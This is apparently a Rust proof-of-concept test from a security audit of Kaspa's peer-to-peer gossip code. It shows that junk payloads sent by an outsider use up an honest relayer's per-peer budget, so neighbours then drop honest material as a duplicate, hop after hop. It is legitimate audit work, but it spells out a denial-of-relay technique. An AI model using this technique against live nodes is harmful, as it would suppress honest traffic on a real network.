// MSK-26A-NET-04 — the unsolicited-material budget is charged to the IMMEDIATE RELAYER, so junk
// that an honest node relays spends that node's budget at its neighbours and the honest material
// it forwards afterwards is dropped as `Duplicate` (not delivered, not relayed).
//
// Audit commit: 3d2bd6dc5d77d37396d1b73c4c13526090923b92
// Crate:        kaspa-p2p-flows (protocol/flows)
// Command:
//   cp docs/security/audits/2026-09-claude-pre-freeze/poc/MSK-26A-NET-04.rs protocol/flows/tests/audit_poc_msk_26a_net_04.rs \
//     && cargo test -p kaspa-p2p-flows --test audit_poc_msk_26a_net_04 -- --nocapture ; \
//     rm protocol/flows/tests/audit_poc_msk_26a_net_04.rs
//
// PASS = the vulnerable behaviour is present: after relaying one window's worth of junk that
// entered at a different node, an honest relayer's own forward of honest material is refused.
//
// Model: `PalwGossipFlow::start_impl` (v8/palw_gossip_flow.rs) calls
// `admit_material(self.router.key(), claim, bytes)` and, on `Fresh`, re-broadcasts to every other
// peer. Here each node is one `PalwGossipCenter` and "relay A -> B" is B admitting under A's
// PeerKey. Nothing here opens a socket. Only the budget-attribution half of the claim is shown;
// the per-peer queue/memory magnitude is not exercised.

use kaspa_consensus_core::config::params::{mainnet_shipped_params, palw_t12_shipped_params};
use kaspa_consensus_core::palw_mode_v2::PalwConsensusMode;
use kaspa_hashes::Hash64;
use kaspa_p2p_flows::palw_gossip::{PALW_MATERIAL_BYTES_PER_PEER_PER_WINDOW, PALW_MATERIAL_MAX_BYTES, PalwGossipAdmit, PalwGossipCenter};
use kaspa_p2p_lib::PeerKey;

fn key(n: u128, ip_last: u8) -> PeerKey {
    PeerKey::new(
        kaspa_utils::networking::PeerId::new(uuid::Uuid::from_u128(n)),
        kaspa_utils::networking::IpAddress::new(std::net::IpAddr::from([10, 0, 0, ip_last])),
    )
}

fn claim(n: u8) -> Hash64 {
    Hash64::from_bytes([n; 64])
}

#[test]
fn relayed_junk_spends_honest_relayer_budget_and_honest_material_is_dropped() {
    // Reachability of the flow gate (`FlowContext::palw_v2_active`).
    assert!(matches!(palw_t12_shipped_params().palw_consensus_mode, PalwConsensusMode::ConsensusV2(_)));
    let mainnet_active = matches!(mainnet_shipped_params().palw_consensus_mode, PalwConsensusMode::ConsensusV2(_));
    println!("testnet-12 palw_v2_active = true; mainnet preset palw_v2_active = {mainnet_active}");

    assert_eq!(PALW_MATERIAL_BYTES_PER_PEER_PER_WINDOW, 4 * PALW_MATERIAL_MAX_BYTES as u64);

    let node_a = PalwGossipCenter::default();
    let node_b = PalwGossipCenter::default();
    let node_c = PalwGossipCenter::default();
    let key_a = key(0xA, 1); // how B sees A
    let key_b = key(0xB, 2); // how C sees B
    let outsider = key(0xE, 9); // an unbonded peer connected to A only

    // The outsider sends four maximal payloads under fresh claim ids that exist nowhere on chain.
    let junk = vec![0u8; PALW_MATERIAL_MAX_BYTES];
    let mut fresh_at_a = Vec::new();
    for i in 0..4u8 {
        let c = claim(0x10 + i);
        let v = node_a.admit_material(outsider, c, &junk);
        assert_eq!(v, PalwGossipAdmit::Fresh, "A admits and would relay junk #{i}");
        fresh_at_a.push(c);
    }

    // A relays each Fresh one to B; B charges A's key.
    let mut fresh_at_b = Vec::new();
    for c in &fresh_at_a {
        let v = node_b.admit_material(key_a, *c, &junk);
        assert_eq!(v, PalwGossipAdmit::Fresh);
        fresh_at_b.push(*c);
    }

    // An honest producer's material (RC-floor size) now reaches B through A in the same window.
    let honest_claim = claim(0x77);
    let honest = vec![0x5a; 2_270_000];
    let at_b = node_b.admit_material(key_a, honest_claim, &honest);
    println!("B admitting honest material from A after relayed junk: {at_b:?}");
    assert_eq!(at_b, PalwGossipAdmit::Duplicate, "BAD: honest material from an honest relayer is refused");

    // One hop further: B relayed the same four junk items to C, so B's budget at C is spent too.
    for c in &fresh_at_b {
        assert_eq!(node_c.admit_material(key_b, *c, &junk), PalwGossipAdmit::Fresh);
    }
    let at_c = node_c.admit_material(key_b, honest_claim, &honest);
    println!("C admitting honest material from B after relayed junk: {at_c:?}");
    assert_eq!(at_c, PalwGossipAdmit::Duplicate, "BAD: the suppression carries hop to hop");

    // Control: a fresh relayer key at B (no junk relayed over it) admits the same honest bytes.
    let control = node_b.admit_material(key(0xF, 3), honest_claim, &honest);
    println!("B admitting the same honest material from an unspent link: {control:?}");
    assert_eq!(control, PalwGossipAdmit::Fresh);
}

#[test]
fn relay_clone_of_material_is_a_deep_copy() {
    // hub.rs `broadcast` enqueues `msg.clone()` per peer; the proto `bytes` field is a Vec<u8>.
    let m = kaspa_p2p_lib::pb::PalwTraceMaterialBroadcastMessage { claim_id: None, material: vec![1u8; 1 << 20] };
    let copy = m.clone();
    assert_ne!(m.material.as_ptr(), copy.material.as_ptr(), "each relayed clone owns its own buffer");
    println!("material clone is a separate allocation of {} bytes", copy.material.len());
}
